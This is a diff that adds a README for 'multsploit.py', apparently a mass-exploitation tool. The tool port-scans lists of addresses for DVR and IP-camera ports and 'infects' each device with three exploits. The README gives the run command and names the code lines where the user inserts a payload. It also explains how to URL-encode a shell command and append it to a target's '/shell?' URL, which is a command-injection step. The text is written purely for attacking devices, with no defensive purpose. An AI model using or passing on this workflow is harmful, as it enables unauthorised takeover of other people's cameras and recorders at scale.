@@ -1,0 +1,13 @@
+So basically this thing portscans every device for common dvr ports (ip cameras) then it will infect the device on every port with three different exploits
+Any List will work, but this does come with one
+usage: python3 multsploit.py list.txt
+PLACES WHERE YOU NEED TO CHANGE YOUR PAYLOAD:
+line 9 
+line 10
+line 65 (url encode)
+To encode your payload go to urlencode.org 
+paste it in
+click encode
+copy it
+paste it in after the shell part of the url
+ex: http:// + host + /shell?URLENCODEDCOMMANDHERE
